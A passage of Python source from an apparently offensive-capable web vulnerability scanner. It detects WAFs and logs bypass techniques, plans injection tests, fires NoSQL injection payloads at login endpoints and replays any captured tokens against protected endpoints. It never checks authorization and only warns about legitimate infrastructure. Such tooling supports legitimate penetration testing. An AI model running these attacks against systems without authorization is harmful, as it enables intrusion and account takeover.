            "quick": 15,
            "standard": 30,
            "thorough": 100,
            "aggressive": 500,
        }
        return limits.get(self.payload_mode, 30)
    
    def get_dynamic_payloads(self, attack_type: str) -> list:
        """
        Get dynamically generated payloads for an attack type.
        
        Uses the Dynamic Payload Engine to generate thousands of
        unique payload combinations based on context.
        
        Args:
            attack_type: Type of attack (sqli, xss, ssti, ssrf, lfi, rce, xxe, nosqli)
        
        Returns:
            List of GeneratedPayload objects (or strings if engine not available)
        """
        if self._payload_engine and HAS_DYNAMIC_PAYLOADS:
            # Update context with detected WAF
            if self._detected_waf and self._detected_waf.detected:
                self._payload_engine.set_context(waf_type=self._detected_waf.waf_type)
            
            return list(self._payload_engine.generate(attack_type))
        
        # Fallback to InteractiveValidator payloads
        fallback_map = {
            'sqli': InteractiveValidator.get_sqli_payloads,
            'nosqli': InteractiveValidator.get_nosql_payloads,
            'xss': InteractiveValidator.get_xss_payloads,
            'ssti': InteractiveValidator.get_ssti_payloads,
            'lfi': InteractiveValidator.get_lfi_payloads,
            'rce': InteractiveValidator.get_rce_payloads,
            'xxe': InteractiveValidator.get_xxe_payloads,
            'ssrf': InteractiveValidator.get_ssrf_payloads,
        }
        func = fallback_map.get(attack_type.lower())
        if func:
            return func()
        return []
    
    def get_payload_stats(self) -> dict:
        """Get statistics about payload generation."""
        if self._payload_engine and HAS_DYNAMIC_PAYLOADS:
            return self._payload_engine.get_stats()
        return {"engine": "fallback", "mode": self.payload_mode}
    
    def _check_false_positive(self, indicator: str, indicator_type: str = "auto") -> tuple[bool, str]:
        """
        Check if an indicator is a known false positive using MISP Warning Lists.
        
        Args:
            indicator: The indicator to check (IP, domain, URL, hash)
            indicator_type: Type of indicator ("ip", "domain", "url", "hash", "auto")
        
        Returns:
            Tuple of (is_false_positive, reason)
        """
        if not self._warning_filter:
            return False, ""
        
        result = self._warning_filter.check_indicator(indicator, indicator_type)
        if result.matched and result.confidence >= 0.5:
            return True, result.description
        return False, ""
    
    def _filter_scan_target(self, target_url: str) -> tuple[bool, str]:
        """
        Check if target URL should be skipped (belongs to known benign infrastructure).
        
        Returns:
            Tuple of (should_skip, reason)
        """
        if not self._warning_filter:
            return False, ""
        
        # Extract domain from URL
        try:
            parsed = urllib.parse.urlparse(target_url)
            domain = parsed.netloc
            if ":" in domain:
                domain = domain.split(":")[0]
            
            # Check domain
            result = self._warning_filter.check_domain(domain)
            if result.matched and result.confidence >= 0.8:
                return True, f"Target is known benign infrastructure: {result.description}"
            
            # Could also check if domain resolves to cloud/cdn IP
            # But that requires DNS lookup which we skip for speed
            
        except Exception:
            pass
        
        return False, ""

    def _capture_baseline(self, endpoint_url: str) -> BaselineResponse:
        """Capture baseline response with invalid credentials for comparison."""
        if endpoint_url in self._baselines:
            return self._baselines[endpoint_url]
        
        self._log(f"[Baseline] Capturing baseline for {endpoint_url}")
        
        # Use random invalid credentials
        import uuid
        random_user = f"invalid_user_{uuid.uuid4().hex[:8]}"
        random_pass = f"invalid_pass_{uuid.uuid4().hex[:8]}"
        
        resp = self._make_request("POST", endpoint_url, json_data={
            "username": random_user,
            "password": random_pass
        })
        
        body_lower = resp.body.lower()
        
        baseline = BaselineResponse(
            status_code=resp.status_code,
            body_length=len(resp.body),
            body_hash=hashlib.md5(resp.body.encode()).hexdigest(),
            has_token=any(tok in body_lower for tok in ["token", "jwt", "access_token", "bearer"]),
            has_user_data=any(tok in body_lower for tok in ['"user":', '"email":', '"id":', '"role":', '"profile":']),
            is_login_page=any(x in body_lower for x in ["<title>log", "login", "password", "sign in", "<!doctype"]),
            content_type=resp.headers.get("Content-Type", "")
        )
        
        self._log(f"[Baseline] Status: {baseline.status_code}, Length: {baseline.body_length}, IsLoginPage: {baseline.is_login_page}")
        
        self._baselines[endpoint_url] = baseline
        return baseline
    
    def _compare_with_baseline(self, baseline: BaselineResponse, resp: HttpResponse) -> dict:
        """Compare response with baseline to detect significant differences."""
        body_lower = resp.body.lower()
        
        comparison = {
            "status_changed": resp.status_code != baseline.status_code,
            "length_diff": abs(len(resp.body) - baseline.body_length),
            "length_diff_percent": (abs(len(resp.body) - baseline.body_length) / max(baseline.body_length, 1)) * 100,
            "body_hash_changed": hashlib.md5(resp.body.encode()).hexdigest() != baseline.body_hash,
            "new_token_appeared": not baseline.has_token and any(tok in body_lower for tok in ["token", "jwt", "access_token"]),
            "new_user_data": not baseline.has_user_data and any(tok in body_lower for tok in ['"user":', '"email":', '"id":']),
            "bypassed_login_page": baseline.is_login_page and "<!doctype" not in body_lower.replace(" ", ""),
        }
        
        # Calculate significance score
        score = 0
        if comparison["status_changed"] and resp.status_code == 200:
            score += 30
        if comparison["new_token_appeared"]:
            score += 40
        if comparison["new_user_data"]:
            score += 30
        if comparison["bypassed_login_page"]:
            score += 25
        if comparison["length_diff_percent"] > 50:
            score += 15
        
        comparison["significance_score"] = score
        comparison["is_significant"] = score >= 30
        
        return comparison
    
    def _extract_token(self, resp: HttpResponse) -> str | None:
        """Extract authentication token from response."""
        try:
            data = json.loads(resp.body)
            for key in ["token", "access_token", "jwt", "accessToken", "id_token", "auth_token"]:
                if key in data:
                    return data[key]
            # Nested check
            if "data" in data and isinstance(data["data"], dict):
                for key in ["token", "access_token", "jwt"]:
                    if key in data["data"]:
                        return data["data"][key]
        except (json.JSONDecodeError, TypeError):
            # Try regex extraction
            patterns = [
                r'"(?:token|access_token|jwt)":\s*"([^"]+)"',
                r'Bearer\s+([A-Za-z0-9\-_]+\.[A-Za-z0-9\-_]+\.[A-Za-z0-9\-_]*)',
            ]
            for pattern in patterns:
                match = re.search(pattern, resp.body)
                if match:
                    return match.group(1)
        return None
    
    def _validate_token(self, base_url: str, token: str) -> tuple[bool, str]:
        """Validate if extracted token grants actual access."""
        protected_endpoints = [
            "/api/v1/profile", "/api/v1/me", "/api/v1/user", "/api/v1/admin",
            "/api/profile", "/api/me", "/api/user", "/profile", "/me", "/admin/dashboard"
        ]
        
        for ep in protected_endpoints:
            url = f"{base_url}{ep}"
            
            # Request without token
            resp_without = self._make_request("GET", url)
            
            # Request with token
            resp_with = self._make_request("GET", url, headers={
                "Authorization": f"Bearer {token}"
            })
            
            # Check if token made a difference
            if resp_without.status_code in (401, 403) and resp_with.status_code == 200:
                # Token granted access
                try:
                    data = json.loads(resp_with.body)
                    if isinstance(data, dict) and any(k in data for k in ["user", "email", "id", "username"]):
                        return True, f"Token validated! Grants access to {ep} with user data: {list(data.keys())[:5]}"
                except:
                    pass
                return True, f"Token validated! Changed {ep} from {resp_without.status_code} to {resp_with.status_code}"
            
            # Check if 200 response contains actual data (not just login page)
            if resp_with.status_code == 200:
                body_lower = resp_with.body.lower()
                is_login_page = any(x in body_lower for x in ["<form", "password", "login", "sign in"])
                
                if not is_login_page:
                    try:
                        data = json.loads(resp_with.body)
                        if isinstance(data, dict) and data:
                            return True, f"Token returns data from {ep}: {list(data.keys())[:3]}"
                    except:
                        if len(resp_with.body) > 100 and "<!doctype" not in body_lower:
                            return True, f"Token returns non-HTML data from {ep}"
        
        return False, "Token could not be validated - may be invalid or endpoints not accessible"
        
    def _make_request(
        self, 
        method: str, 
        url: str, 
        headers: dict | None = None,
        data: Any = None,
        json_data: Any = None
    ) -> HttpResponse:
        """Make HTTP request and capture response.
        
        Auto-detects data type:
        - dict in data → form-urlencoded
        - json_data → JSON
        - str/bytes in data → raw
        """
        import time
        start = time.time()
        
        default_headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Accept": "application/json, text/html, */*",
            "Accept-Language": "en-US,en;q=0.9",
        }
        if headers:
            default_headers.update(headers)
        
        # Auto-detect: if data is dict, convert to form-urlencoded
        if isinstance(data, dict):
            data = urllib.parse.urlencode(data)
            if "Content-Type" not in default_headers:
                default_headers["Content-Type"] = "application/x-www-form-urlencoded"
            
        try:
            if HAS_REQUESTS:
                resp = self.session.request(
                    method=method,
                    url=url,
                    headers=default_headers,
                    data=data,
                    json=json_data,
                    timeout=(self.timeout, self.timeout),  # (connect, read) timeouts
                    verify=self.verify_ssl,
                    allow_redirects=True,
                    stream=False  # Don't stream - read entire response
                )
                elapsed = (time.time() - start) * 1000
                # Limit response body size to avoid hanging on large responses
                body = resp.text[:50000] if len(resp.text) > 50000 else resp.text
                return HttpResponse(
                    status_code=resp.status_code,
                    headers=dict(resp.headers),
                    body=body,
                    elapsed_ms=elapsed
                )
            else:
                # Fallback to urllib
                req_data = None
                if json_data:
                    req_data = json.dumps(json_data).encode('utf-8')
                    default_headers["Content-Type"] = "application/json"
                elif data:
                    req_data = data.encode('utf-8') if isinstance(data, str) else data
                    
                req = urllib.request.Request(url, data=req_data, headers=default_headers, method=method)
                ctx = ssl.create_default_context()
                if not self.verify_ssl:
                    ctx.check_hostname = False
                    ctx.verify_mode = ssl.CERT_NONE
                    
                with urllib.request.urlopen(req, timeout=self.timeout, context=ctx) as resp:
                    elapsed = (time.time() - start) * 1000
                    return HttpResponse(
                        status_code=resp.status,
                        headers=dict(resp.headers),
                        body=resp.read().decode('utf-8', errors='replace'),
                        elapsed_ms=elapsed
                    )
        except Exception as e:
            elapsed = (time.time() - start) * 1000
            return HttpResponse(
                status_code=0,
                headers={},
                body="",
                elapsed_ms=elapsed,
                error=str(e)
            )
    
    def _hash_evidence(self, data: str) -> str:
        """Generate SHA256 hash of evidence."""
        return f"sha256:{hashlib.sha256(data.encode()).hexdigest()[:16]}"
    
    def scan_target(self, target_url: str) -> ScanResult:
        """Perform full scan on target with smart test selection."""
        timestamp = datetime.now().isoformat()
        
        # Reset tracking
        self._filtered_false_positives = []
        
        # Normalize URL
        if not target_url.startswith(('http://', 'https://')):
            target_url = f"https://{target_url}"
        target_url = target_url.rstrip('/')
        
        # Check if target is known benign infrastructure (optional warning)
        is_benign, benign_reason = self._filter_scan_target(target_url)
        if is_benign and self.verbose:
            print(f"[!] WARNING: {benign_reason}")
            print("[!] Scanning known legitimate infrastructure may be against ToS")
        
        # Phase 1: Reconnaissance
        if self.verbose:
            print("\n[*] Phase 1: Reconnaissance & Tech Stack Detection...")
        tech_stack = self._detect_tech_stack(target_url)
        endpoints = self._discover_endpoints(target_url)
        
        # Phase 1.5: WAF Detection
        if self.verbose:
            print("\n[*] Phase 1.5: WAF Detection...")
        waf_result = self._detect_waf(target_url)
        self._detected_waf = waf_result  # Store for use in vulnerability tests
        
        # Phase 1.6: Start OOB Server for blind vulnerability detection
        oob_started = False
        if self._oob_enabled:
            if self.verbose:
                print("\n[*] Phase 1.6: Starting OOB Callback Server...")
            oob_started = self.start_oob_server()
        
        if self.verbose:
            print(f"    Server: {tech_stack.server or 'Unknown'}")
            print(f"    Framework: {tech_stack.framework or 'Unknown'}")
            print(f"    Language: {tech_stack.language or 'Unknown'}")
            print(f"    Database: {tech_stack.database or 'Unknown'}")
            if waf_result.detected:
                print(f"    WAF: {waf_result.waf_type} (confidence: {waf_result.confidence:.0%})")
            else:
                print(f"    WAF: Not detected")
            if oob_started:
                print(f"    OOB Server: {self._oob_host}:{self._oob_port}")
            print(f"    Endpoints found: {len(endpoints)}")
        
        # Phase 2: Smart Test Selection based on Tech Stack
        test_plan = self._create_test_plan(tech_stack, endpoints)
        
        if self.verbose:
            print(f"\n[*] Phase 2: Smart Test Selection (based on detected stack)")
            print(f"    Priority tests: {', '.join(test_plan['priority'])}")
            print(f"    Secondary tests: {', '.join(test_plan['secondary'])}")
            print(f"    Skipped tests: {', '.join(test_plan['skip'])} (not relevant)")
        
        # Phase 3: Execute Tests in Priority Order
        if self.verbose:
            print("\n[*] Phase 3: Vulnerability Testing with Auto-Verification...")
        
        vulnerabilities = []
        raw_responses = []
        
        # Run priority tests first
        for test_type in test_plan['priority']:
            results = self._run_test_type(test_type, target_url, endpoints, tech_stack)
            vulnerabilities.extend(results)
            
            # Adaptive: if we find something, explore related tests
            confirmed = [v for v in results if v.is_vulnerable]
            if confirmed and self.verbose:
                print(f"    [!] Found {len(confirmed)} {test_type} vulnerabilities - exploring related vectors...")
        
        # Run secondary tests
        for test_type in test_plan['secondary']:
            results = self._run_test_type(test_type, target_url, endpoints, tech_stack)
            vulnerabilities.extend(results)
        
        # Print verification summary
        if self.verbose:
            confirmed = [v for v in vulnerabilities if v.is_vulnerable]
            potential = [v for v in vulnerabilities if not v.is_vulnerable and v.confidence > 0.3]
            print(f"\n[*] Auto-Verification Summary:")
            print(f"    [+] VERIFIED vulnerabilities: {len(confirmed)}")
            print(f"    [?] Needs manual verification: {len(potential)}")
            print(f"    [-] FALSE POSITIVES filtered: {len(self._filtered_false_positives)}")
            
            if self._filtered_false_positives:
                print(f"\n[*] Filtered False Positives:")
                by_type = {}
                for fp in self._filtered_false_positives:
                    t = fp["type"]
                    if t not in by_type:
                        by_type[t] = []
                    by_type[t].append(fp)
                
                for vuln_type, items in by_type.items():
                    print(f"    {vuln_type}: {len(items)} payloads filtered")
                    if len(items) <= 3:
                        for item in items:
                            print(f"      - {item['reason']}")
            
            # Report OOB callback statistics
            if self._oob_server:
                callback_log = self._oob_server.get_callback_log()
                if callback_log:
                    print(f"\n[*] OOB Callbacks received: {len(callback_log)}")
        
        # Cleanup: Stop OOB server
        if self._oob_server:
            self.stop_oob_server()
        
        return ScanResult(
            target=target_url,
            timestamp=timestamp,
            tech_stack=tech_stack,
            endpoints=endpoints,
            vulnerabilities=vulnerabilities,
            raw_responses=raw_responses
        )
    
    def _create_test_plan(self, tech_stack: TechStack, endpoints: list[EndpointInfo]) -> dict:
        """
        Create smart test plan based on detected technology stack.
        
        Returns dict with:
          - priority: tests to run first (high relevance)
          - secondary: tests to run after (medium relevance)
          - skip: tests not relevant for this stack
        """
        priority = []
        secondary = []
        skip = []
        
        lang = (tech_stack.language or "").lower()
        fw = (tech_stack.framework or "").lower()
        db = (tech_stack.database or "").lower()
        server = (tech_stack.server or "").lower()
        
        # Check for GraphQL endpoint
        has_graphql = any("/graphql" in e.url.lower() for e in endpoints)
        
        # Check for file upload endpoints
        has_upload = any(
            "upload" in e.url.lower() or 
            "file" in e.url.lower() or
            "image" in e.url.lower()
            for e in endpoints
        )
        
        # Check for URL parameters (potential SSRF, redirect targets)
        has_url_params = any(
            any(p.lower() in ["url", "redirect", "next", "return", "callback", "dest", "target", "link", "path"]
                for p in e.parameters)
            for e in endpoints
        )
        
        # === Database-specific tests ===
        if "mongo" in db:
            priority.append("nosql")
            skip.append("sqli")
        elif db in ["mysql", "postgres", "postgresql", "mssql", "oracle", "sqlite"]:
            priority.append("sqli")
            skip.append("nosql")
        else:
            # Unknown DB - test both
            secondary.append("sqli")
            secondary.append("nosql")
        
        # === Language/Framework-specific tests ===
        
        # PHP
        if "php" in lang or "laravel" in fw or "wordpress" in fw or "drupal" in fw:
            priority.extend(["lfi", "rce", "type_juggling", "deserialization"])
            if "wordpress" in fw:
                priority.append("wordpress")  # WP-specific vulnerabilities
        
        # Python
        elif "python" in lang or "django" in fw or "flask" in fw or "fastapi" in fw:
            priority.extend(["ssti", "deserialization"])
            if "django" in fw:
                secondary.append("sqli")  # Django ORM bypass
            if "flask" in fw or "jinja" in fw:
                priority.append("ssti")  # Jinja2 SSTI
        
        # Node.js
        elif "node" in lang or "express" in fw or "next" in fw:
            priority.extend(["prototype_pollution", "nosql", "ssti"])
            secondary.append("ssrf")
        
        # Java
        elif "java" in lang or "spring" in fw or "struts" in fw or "tomcat" in server:
            priority.extend(["deserialization", "xxe", "ssti"])
            if "struts" in fw:
                priority.append("rce")  # Struts RCE is common
        
        # .NET
        elif "asp" in lang or ".net" in lang or "iis" in server:
            priority.extend(["deserialization", "xxe", "sqli"])
        
        # Ruby
        elif "ruby" in lang or "rails" in fw:
            priority.extend(["ssti", "deserialization", "mass_assignment"])
        
        # === Universal tests (always relevant) ===
        if "auth" not in [t for t in priority + secondary]:
            priority.append("auth")  # Auth bypass
        
        if "xss" not in [t for t in priority + secondary]:
            secondary.append("xss")
        
        if "jwt" not in [t for t in priority + secondary]:
            secondary.append("jwt")
        
        # === Feature-specific tests ===
        if has_graphql:
            priority.append("graphql")
        
        if has_upload:
            priority.append("file_upload")
        
        if has_url_params:
            priority.extend(["ssrf", "open_redirect"])
        else:
            secondary.extend(["ssrf", "open_redirect"])
        
        # === Server-specific ===
        if "nginx" in server:
            secondary.append("crlf")  # Header injection
        
        if "apache" in server:
            secondary.extend(["crlf", "lfi"])
        
        # === Additional tests ===
        if "cors" not in [t for t in priority + secondary]:
            secondary.append("cors")
        
        # === Blind tests (OOB-based) for thorough/aggressive modes ===
        if self._oob_enabled and self.payload_mode in ("thorough", "aggressive"):
            secondary.extend(["blind_sqli", "blind_rce", "blind_xxe"])
        
        # Remove duplicates while preserving order
        priority = list(dict.fromkeys(priority))
        secondary = list(dict.fromkeys([t for t in secondary if t not in priority]))
        
        return {
            "priority": priority,
            "secondary": secondary,
            "skip": skip
        }
    
    def _run_test_type(self, test_type: str, target_url: str, 
                       endpoints: list[EndpointInfo], tech_stack: TechStack) -> list:
        """Execute a specific test type and return results."""
        results = []
        
        if self.verbose:
            print(f"\n[*] Testing: {test_type.upper()}")
        
        if test_type == "nosql":
            for endpoint in endpoints:
                results.extend(self._test_nosql_injection(endpoint))
        
        elif test_type == "sqli":
            for endpoint in endpoints:
                results.extend(self._test_sql_injection(endpoint))
        
        elif test_type == "auth":
            for endpoint in endpoints:
                results.extend(self._test_auth_bypass(endpoint))
        
        elif test_type == "jwt":
            results.extend(self._test_jwt_vulnerabilities(target_url))
        
        elif test_type == "xss":
            results.extend(self._test_xss(target_url, endpoints))
        
        elif test_type == "ssrf":
            results.extend(self._test_ssrf(target_url, endpoints))
        
        elif test_type == "ssti":
            results.extend(self._test_ssti(target_url, endpoints, tech_stack))
        
        elif test_type == "lfi":
            results.extend(self._test_lfi(target_url, endpoints))
        
        elif test_type == "xxe":
            results.extend(self._test_xxe(target_url, endpoints))
        
        elif test_type == "rce":
            results.extend(self._test_rce(target_url, endpoints))
        
        elif test_type == "crlf":
            results.extend(self._test_crlf(target_url, endpoints))
        
        elif test_type == "open_redirect":
            results.extend(self._test_open_redirect(target_url, endpoints))
        
        elif test_type == "cors":
            results.extend(self._test_cors(target_url))
        
        elif test_type == "graphql":
            results.extend(self._test_graphql(target_url, endpoints))
        
        elif test_type == "file_upload":
            results.extend(self._test_file_upload(target_url, endpoints))
        
        elif test_type == "prototype_pollution":
            results.extend(self._test_prototype_pollution(target_url, endpoints))
        
        elif test_type == "deserialization":
            results.extend(self._test_deserialization(target_url, endpoints, tech_stack))
        
        elif test_type == "type_juggling":
            results.extend(self._test_type_juggling(target_url, endpoints))
        
        elif test_type == "mass_assignment":
            results.extend(self._test_mass_assignment(target_url, endpoints))
        
        elif test_type == "wordpress":
            results.extend(self._test_wordpress(target_url, endpoints))
        
        # Blind vulnerability tests using OOB
        elif test_type == "blind_sqli":
            if self._oob_enabled and self._blind_detector:
                for endpoint in endpoints:
                    if endpoint.parameters:
                        for param in endpoint.parameters:
                            results.extend(self.test_blind_vulnerability(
                                endpoint, param, "sqli"
                            ))
        
        elif test_type == "blind_rce":
            if self._oob_enabled and self._blind_detector:
                for endpoint in endpoints:
                    if endpoint.parameters:
                        for param in endpoint.parameters:
                            results.extend(self.test_blind_vulnerability(
                                endpoint, param, "rce"
                            ))
        
        elif test_type == "blind_xxe":
            if self._oob_enabled and self._blind_detector:
                for endpoint in endpoints:
                    results.extend(self.test_blind_vulnerability(
                        endpoint, "body", "xxe"
                    ))
        
        else:
            if self.verbose:
                print(f"    [!] Test type '{test_type}' not implemented yet")
        
        return results
    
    def _detect_waf(self, base_url: str) -> WAFDetectionResult:
        """Detect WAF protecting the target."""
        self._log("[WAF] Starting WAF detection...")
        
        # First, get baseline response
        baseline_resp = self._make_request("GET", base_url)
        
        # Check baseline for WAF signatures
        cookies = baseline_resp.headers.get("Set-Cookie", "")
        baseline_detection = WAFDetector.detect_from_response(
            baseline_resp.headers, 
            baseline_resp.body,
            baseline_resp.status_code,
            cookies
        )
        
        if baseline_detection.detected:
            self._log(f"[WAF] Detected from baseline: {baseline_detection.waf_type} "
                     f"(confidence: {baseline_detection.confidence:.0%})")
            return baseline_detection
        
        # Send probe payloads to trigger WAF
        best_detection = baseline_detection
        probe_payloads = WAFDetector.get_probe_payloads()
        
        for payload in probe_payloads:
            test_url = f"{base_url}/?test={urllib.parse.quote(payload)}"
            resp = self._make_request("GET", test_url)
            cookies = resp.headers.get("Set-Cookie", "")
            
            detection = WAFDetector.detect_from_response(
                resp.headers,
                resp.body,
                resp.status_code,
                cookies
            )
            
            if detection.detected and detection.confidence > best_detection.confidence:
                best_detection = detection
                self._log(f"[WAF] Detected via probe: {detection.waf_type} "
                         f"(confidence: {detection.confidence:.0%})")
        
        if best_detection.detected:
            self._log(f"[WAF] WAF detected: {best_detection.waf_type}")
            if best_detection.captcha_detected:
                self._log(f"[WAF] Captcha detected: {best_detection.captcha_detected}")
            self._log(f"[WAF] Suggested bypass techniques:")
            for technique in best_detection.bypass_techniques[:3]:
                self._log(f"      - {technique}")
        else:
            self._log("[WAF] No WAF detected (or using transparent mode)")
        
        return best_detection
    
    def _detect_tech_stack(self, base_url: str) -> TechStack:
        """Detect technology stack from headers and responses."""
        resp = self._make_request("GET", base_url)
        
        tech = TechStack()
        tech.headers = resp.headers
        
        # Server detection
        tech.server = resp.headers.get("Server", resp.headers.get("server", ""))
        
        # Framework detection from headers
        powered_by = resp.headers.get("X-Powered-By", resp.headers.get("x-powered-by", ""))
        if powered_by:
            tech.framework = powered_by
            if "express" in powered_by.lower():
                tech.language = "Node.js"
            elif "php" in powered_by.lower():
                tech.language = "PHP"
            elif "asp.net" in powered_by.lower():
                tech.language = "C#/.NET"
        
        # Framework detection from response body and headers
        body_lower = resp.body.lower()
        link_header = resp.headers.get("Link", "")
        
        # WordPress detection (check multiple indicators)
        if any([
            "wp-json" in link_header,
            "wp-content" in body_lower,
            "wp-includes" in body_lower,
            "wordpress" in body_lower,
            "wp-login" in body_lower,
        ]):
            tech.framework = "WordPress"
            tech.language = "PHP"
            tech.database = tech.database or "MySQL"
        elif "django" in body_lower or "csrfmiddlewaretoken" in body_lower:
            tech.framework = tech.framework or "Django"
            tech.language = tech.language or "Python"
        elif "laravel" in body_lower or "laravel_session" in resp.headers.get("Set-Cookie", "").lower():
            tech.framework = tech.framework or "Laravel"
            tech.language = tech.language or "PHP"
        elif "next" in resp.headers.get("X-Powered-By", "").lower():
            tech.framework = tech.framework or "Next.js"
            tech.language = tech.language or "Node.js"
        elif "express" in body_lower or "__express" in body_lower:
            tech.framework = tech.framework or "Express.js"
            tech.language = tech.language or "Node.js"
            
        # Cookie detection
        set_cookie = resp.headers.get("Set-Cookie", resp.headers.get("set-cookie", ""))
        if set_cookie:
            tech.cookies = [c.split(";")[0] for c in set_cookie.split(",")]
            
        # Database hints
        if "mongo" in body_lower or "mongodb" in body_lower:
            tech.database = "MongoDB"
        elif "mysql" in body_lower:
            tech.database = "MySQL"
        elif "postgres" in body_lower:
            tech.database = "PostgreSQL"
            
        return tech
    
    def _discover_endpoints(self, base_url: str) -> list[EndpointInfo]:
        """Discover API endpoints."""
        endpoints = []
        
        # Common API paths to probe
        common_paths = [
            "/api/v1/login",
            "/api/v1/auth",
            "/api/v1/users",
            "/api/v1/admin",
            "/api/v1/profile",
            "/api/login",
            "/api/auth",
            "/api/users",
            "/auth/login",
            "/auth/signin",
            "/login",
            "/signin",
            "/register",
            "/signup",
            "/admin",
            "/admin/login",
            "/user",
            "/users",
            "/profile",
            "/account",
            "/graphql",
            "/api/graphql",
            "/.well-known/openid-configuration",
            "/oauth/token",
            "/api/token",
            "/swagger.json",
            "/openapi.json",
            "/api-docs",
        ]
        
        for path in common_paths:
            url = f"{base_url}{path}"
            
            # Try GET first
            resp = self._make_request("GET", url)
            if resp.status_code not in (0, 404, 403):
                endpoint = EndpointInfo(
                    url=url,
                    method="GET",
                    content_type=resp.headers.get("Content-Type", ""),
                    requires_auth=resp.status_code == 401
                )
                endpoints.append(endpoint)
            
            # Try POST for auth endpoints
            if any(auth in path for auth in ["login", "auth", "signin", "token"]):
                resp = self._make_request("POST", url, json_data={"test": "probe"})
                if resp.status_code not in (0, 404):
                    # Try to detect parameters from error response
                    params = self._extract_params_from_response(resp.body)
                    endpoint = EndpointInfo(
                        url=url,
                        method="POST",
                        parameters=params or ["username", "password"],
                        content_type="application/json",
                        requires_auth=False
                    )
                    if endpoint not in endpoints:
                        endpoints.append(endpoint)
        
        return endpoints
    
    def _extract_params_from_response(self, body: str) -> list[str]:
        """Extract parameter names from error responses."""
        params = []
        
        # Common patterns in error messages
        patterns = [
            r'"(\w+)" is required',
            r'missing (?:required )?(?:field |parameter )?["\']?(\w+)',
            r'expected ["\']?(\w+)["\']?',
            r'["\'](\w+)["\'] must be',
        ]
        
        for pattern in patterns:
            matches = re.findall(pattern, body, re.IGNORECASE)
            params.extend(matches)
            
        return list(set(params))
    
    def _test_nosql_injection(self, endpoint: EndpointInfo) -> list[VulnTestResult]:
        """Test for NoSQL injection vulnerabilities with interactive validation."""
        results = []
        
        if endpoint.method != "POST":
            return results
        
        # Get baseline first
        baseline = self._capture_baseline(endpoint.url)
        base_url = endpoint.url.rsplit('/', 1)[0].rsplit('/login', 1)[0].rsplit('/auth', 1)[0]
        
        # Get interactive payloads from validator
        interactive_payloads = InteractiveValidator.get_nosql_payloads()
        
        # WAF info logging
        waf_info = ""
        if self._detected_waf and self._detected_waf.detected:
            waf_info = f" (WAF: {self._detected_waf.waf_type})"
        
        self._log(f"[NoSQLi] Testing {len(interactive_payloads)} interactive payloads on {endpoint.url}{waf_info}")
        
        for ipayload in interactive_payloads:
            # Parse payload string to dict if needed
            try:
                payload_dict = json.loads(ipayload.payload) if isinstance(ipayload.payload, str) else ipayload.payload
            except:
                payload_dict = ipayload.payload
            
            # Build request with payload in common auth fields
            test_data = {}
            for field in ["username", "email", "user", "login"]:
                test_data[field] = payload_dict
            for field in ["password", "pass", "pwd"]:
                test_data[field] = payload_dict
                
            resp = self._make_request("POST", endpoint.url, json_data=test_data)
            
            # Use InteractiveValidator for primary validation
            is_vuln, confidence, evidence = InteractiveValidator.validate_response(
                ipayload,
                resp.body,
                resp.elapsed_ms,
                resp.status_code
            )
            
            # If interactive validation passes, it's confirmed
            if is_vuln:
                self._log(f"[!] CONFIRMED NoSQL Injection via {ipayload.validation_type}!")
                
                # Additional token validation for auth_bypass type
                if ipayload.validation_type == "auth_bypass":
                    token = self._extract_token(resp)
                    if token:
                        is_valid, validation_msg = self._validate_token(base_url, token)
                        if is_valid:
                            evidence = f"[CONFIRMED] NoSQL auth bypass - Token validated: {validation_msg}"
                            confidence = 0.98
                        else:
                            evidence = f"[LIKELY] Auth bypass - Token found but not validated: {validation_msg}"
                            confidence = 0.80
                
                results.append(VulnTestResult(
                    vuln_type=f"NoSQL Injection ({ipayload.validation_type})",
                    payload=json.dumps(payload_dict),
                    target_url=endpoint.url,
                    request_data=json.dumps(test_data),
                    response=resp,
                    is_vulnerable=True,
                    confidence=confidence,
                    evidence=evidence,
                    evidence_hash=self._hash_evidence(f"{ipayload.validation_type}:{resp.status_code}:{resp.elapsed_ms}")
                ))
                break  # Found confirmed vuln
            
            # Fallback to baseline comparison for uncertain cases
            comparison = self._compare_with_baseline(baseline, resp)
            fallback_vuln, fallback_conf, fallback_evidence = self._analyze_nosql_response_v2(
                resp, payload_dict, baseline, comparison, base_url
            )
            
            if fallback_vuln or fallback_conf > 0.5:
                self._log(f"[~] NoSQLi detected via baseline comparison: {fallback_evidence[:50]}...")
                results.append(VulnTestResult(
                    vuln_type="NoSQL Injection (baseline)",
                    payload=json.dumps(payload_dict),
                    target_url=endpoint.url,
                    request_data=json.dumps(test_data),
                    response=resp,
                    is_vulnerable=fallback_vuln,
                    confidence=fallback_conf,
                    evidence=fallback_evidence,
                    evidence_hash=self._hash_evidence(f"{resp.status_code}:{resp.body[:500]}")
                ))
                
                if fallback_vuln:
                    break
                    
        return results
    
    def _analyze_nosql_response_v2(
        self, 
        resp: HttpResponse, 
        payload: Any, 
        baseline: BaselineResponse,
        comparison: dict,
        base_url: str
    ) -> tuple[bool, float, str]:
        """Analyze response with baseline comparison and token validation."""
        if resp.error:
            return False, 0.0, f"Request failed: {resp.error}"
            
        body_lower = resp.body.lower()
        
        # Step 1: Check for MongoDB errors (definitive indicator)
        if any(err in body_lower for err in ["mongodb", "bson", "objectid", "mongoose", "$where", "mongo"]):
            self._log(f"[+] MongoDB error detected in response!")
            return True, 0.95, f"[VERIFIED] MongoDB error leaked in response"
        
        # Step 2: Check for token and validate it
        token = self._extract_token(resp)
        if token:
            self._log(f"[*] Token found, attempting validation...")
            is_valid, validation_msg = self._validate_token(base_url, token)
            if is_valid:
                self._log(f"[+] Token VALIDATED: {validation_msg}")
                return True, 0.98, f"[VERIFIED] NoSQL auth bypass - {validation_msg}"
            else:
                self._log(f"[-] Token found but invalid: {validation_msg}")
                # Token found but couldn't validate
                return False, 0.6, f"Token received but unverified: {validation_msg}"
        
        # Step 3: Compare with baseline
        if comparison["is_significant"]:
            if comparison["new_user_data"]:
                self._log(f"[+] New user data appeared (not in baseline)")
                return True, 0.85, f"[VERIFIED] Response contains user data not in baseline (score: {comparison['significance_score']})"
            if comparison["bypassed_login_page"]:
                self._log(f"[~] Login page structure changed")
                return True, 0.75, f"[LIKELY] Bypassed login page, response structure changed"
            if comparison["significance_score"] >= 40:
                self._log(f"[?] Significant diff (score: {comparison['significance_score']})")
                return False, 0.5, f"Significant response difference (score: {comparison['significance_score']}). Manual verification recommended."
        
        # Step 4: Check if same as baseline (false positive)
        if not comparison["body_hash_changed"] and resp.status_code == baseline.status_code:
